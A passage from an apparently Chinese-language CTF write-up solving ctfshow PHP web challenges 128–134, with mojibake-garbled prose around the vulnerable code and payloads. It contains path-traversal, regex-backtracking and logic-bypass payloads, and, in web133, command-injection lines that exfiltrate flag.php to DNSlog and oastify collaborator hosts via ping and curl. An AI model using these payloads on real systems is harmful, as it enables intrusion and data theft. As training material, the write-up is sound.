single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">å…³äºphpä¸­gettextçš„ç”¨æ³•ï¼Ÿ</a></p><p>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>**get_defined_vars()**å‡½æ•°</p><p>get_defined_vars â€”&gt;è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-ç›®å½•ç©¿è¶Š"><a href="#web129-stripos-ç›®å½•ç©¿è¶Š" class="headerlink" title="web129(stripos  ç›®å½•ç©¿è¶Š)"></a>web129(stripos  ç›®å½•ç©¿è¶Š)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>stripos() å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚</p><p>ç›®å½•ç©¿è¶Š</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1ï¼‰ç¬¬ä¸€ä¸ªåˆ¤æ–­ã€‚<br>.+?è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦ä¸€ä¸ªæˆ–åˆ™å¤šä¸ªã€‚<br>.*? è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦0ä¸ªæˆ–å¤šä¸ªã€‚</p><p>. åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ã€‚</p><ul><li>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚<br>? åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ã€‚<br>&#x2F;iä¸åŒºåˆ†å¤§å°å†™<br>&#x2F;s åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚<br>é¢˜ä¸­æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€å°±æ˜¯ï¼Œä»¥ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦å¼€å¤´ï¼Œé‡åˆ°ctfshowå°±åŒ¹é…ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œä¸èƒ½æœ‰ä»»ä½•ç©ºç™½å­—ç¬¦ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´è¾“å…¥çš„å†…å®¹é‡Œï¼Œctfshowå‰é¢ä¸èƒ½æœ‰å­—ç¬¦ã€‚</p><p>2ï¼‰ç¬¬äºŒä¸ªåˆ¤æ–­ã€‚striposå‡½æ•°å¦‚æœæœªå‘ç°å­—ç¬¦ä¸²å°†è¿”å› FALSEã€‚<br>å…¨ç­‰äºçš„æ¡ä»¶æ˜¯å¿…é¡»åŒæ–¹çš„ç±»å‹ä¹Ÿä¸€æ ·ï¼Œæ‰€ä»¥ctfshowåœ¨é¦–ä½è¿”å›çš„0ä¸FLASEä¸å…¨ç­‰ã€‚</p><p>æ‰€ä»¥payload:<code>POST:f=ctfshow</code></p><h4 id="web131-æ­£åˆ™æœ€å¤§å›æº¯"><a href="#web131-æ­£åˆ™æœ€å¤§å›æº¯" class="headerlink" title="web131(æ­£åˆ™æœ€å¤§å›æº¯)"></a>web131(æ­£åˆ™æœ€å¤§å›æº¯)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ·±æ‚‰æ­£åˆ™(pcre)æœ€å¤§å›æº¯&#x2F;é€’å½’é™åˆ¶</a></p><p>åœ¨phpä¸­æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œè¶…è¿‡é™åˆ¶ç›´æ¥è¿”å›false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡"><a href="#web132-PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡" class="headerlink" title="web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)"></a>web132(PHPé€»è¾‘è¿ç®—ç¬¦ç»•è¿‡)</h4><p>è®¿é—®<code>robots.txt</code>â€“&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHPä¸­é€»è¾‘è¿ç®—ç¬¦çš„é«˜æ•ˆç”¨æ³•â€”&amp;&amp;å’Œ||</a></p><p>å¯¹äºâ€œä¸â€ï¼ˆ**&amp;&amp;<strong>ï¼‰ è¿ç®—ï¼š <strong>x &amp;&amp; y</strong> å½“</strong>x<strong>ä¸º</strong>false<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y<strong>ï¼›<br>å¯¹äºâ€œæˆ–â€ï¼ˆ</strong>||<strong>ï¼‰ è¿ç®— ï¼š  <strong>x||y</strong> å½“</strong>x<strong>ä¸º</strong>true<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y**ã€‚</p><p>æ‰€ä»¥payloadï¼š<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substrç»•è¿‡-DNSlog-Collaborator-Client"><a href="#web133-substrç»•è¿‡-DNSlog-Collaborator-Client" class="headerlink" title="web133(substrç»•è¿‡ DNSlog Collaborator Client)"></a>web133(substrç»•è¿‡ DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>æˆ‘ä»¬ä¼ é€’?F&#x3D;<code>$F</code>;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤<br>é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ<br>å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„<code>$F</code>;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°<br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œæ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚<br>è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„<code>$F</code>;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯<br><code>$F</code>;+sleep 3,å°±æ‰§è¡ŒæˆåŠŸ<br>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" åªä¼šè¢«å±•å¼€ä¸€æ¬¡</span></code></pre><blockquote><p>åˆ©ç”¨<code>$F</code>;è®©evalæ‰§è¡Œshellè¯­å¥ã€‚<br>è¿™ä¸€ä¸²å­—ç¬¦é•¿åº¦æ˜¯5ï¼ŒåŠ ä¸ªç©ºæ ¼ï¼Œæ»¡è¶³substrçš„6ä¸ªå­—ç¬¦æˆªå–ï¼Œè®©evalæ‰§è¡Œ<code>$F</code>;</p><p>å¦‚ä¼ é€’<code>$F</code>;+sleep 3ï¼Œé¡µé¢ä¼šsleepä¸€ä¼šã€‚å…·ä½“æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(â€œ<code>$F</code>; â€œ);<br>&#x3D;&#x3D;&gt;php:   eval(â€œ&#96;&#96;$F<code>; sleep 3</code>; â€œ);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>æ‰€ä»¥å°±æ‰§è¡Œäº†sleep 3</p></blockquote><p>æ–¹æ³•ä¸€(DNSlogå¤–å¸¦)ï¼šï¼ˆæ²¡æˆåŠŸï¼‰</p><p><a href="http://www.dnslog.cn/">åœ¨çº¿DNSlog</a></p><p>å…ˆå¾—åˆ°ä¸€ä¸ªåŸŸåï¼Œç„¶ååˆ©ç”¨dnslogå®ç°å‘½ä»¤å›æ˜¾ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>å½“pingä¸€ä¸ªåŸŸåæ—¶ä¼šå¯¹å…¶è¿›è¡Œä¸€ä¸ªé€’å½’ DNS æŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½åœ¨åç«¯è·å–åˆ° DNS çš„æŸ¥è¯¢è¯·æ±‚ï¼Œå½“å‘½ä»¤çœŸæ­£è¢«æ‰§è¡Œä¸”å¹³å°æ”¶åˆ°å›æ˜¾æ—¶å°±èƒ½è¯´æ˜æ¼æ´ç¡®å®å­˜åœ¨ã€‚</p><p>flag.phpæ˜¯å¤šè¡Œï¼Œéœ€è¦grepä¸€ä¸‹ï¼Œå…¶æ¬¡ä¸èƒ½å«æœ‰ç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥trè®¾ç½®ä¸€ä¸‹è¿”å›ç»“æœåªæºå¸¦å­—æ¯å’Œæ•°å­—ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>æ–¹æ³•äºŒ( Collaborator Client Curl -F):</p><p>ä½¿ç”¨curl -Få‘½ä»¤ã€‚-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-å˜é‡è¦†ç›–"><a href="#web134-å˜é‡è¦†ç›–" class="headerlink" title="web134(å˜é‡è¦†ç›–)"></a>web134(å˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>çœ‹åˆ°parse_strå’Œextractã€‚å˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’ã€‚</p><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ã€‚ä¾‹å¦‚ä¼ é€’?a&#x3D;1ï¼Œæ‰§è¡Œåå°±æ˜¯$a&#x3D;1ã€‚<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ 